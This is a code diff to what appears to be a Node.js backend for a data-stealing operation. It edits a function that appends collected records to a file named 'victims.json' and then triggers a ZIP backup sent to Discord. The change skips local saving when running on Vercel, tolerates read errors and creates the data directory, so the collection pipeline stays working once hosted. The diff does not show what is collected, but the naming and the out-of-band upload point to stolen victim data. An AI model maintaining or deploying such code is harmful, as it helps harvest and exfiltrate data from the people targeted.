@@ -97,14 +97,19 @@ async function sendZipToDiscord() {
   }
 }
 
-// Save to local JSON
+// Save to local JSON (Disabled on Vercel as disk is read-only)
 async function saveToLocal(data) {
+  if (process.env.VERCEL) {
+    console.log('ℹ️ Running on Vercel, skipping local file save.');
+    return;
+  }
+
   const dataPath = path.join(__dirname, '..', 'data', 'victims.json');
   
   try {
     let victims = [];
     if (await fs.pathExists(dataPath)) {
-      victims = await fs.readJson(dataPath);
+      victims = await fs.readJson(dataPath).catch(() => []);
     }
 
     victims.push({
@@ -112,13 +117,14 @@ async function saveToLocal(data) {
       timestamp: new Date().toISOString()
     });
 
+    await fs.ensureDir(path.join(__dirname, '..', 'data'));
     await fs.writeJson(dataPath, victims, { spaces: 2 });
     console.log('✅ Data saved to victims.json');
 
     // Trigger ZIP backup
     await sendZipToDiscord();
   } catch (err) {
-    console.error('❌ Failed to save locally:', err.response?.data || err.message);
+    console.error('⚠️ Skipping local save:', err.message);
   }
 }
 
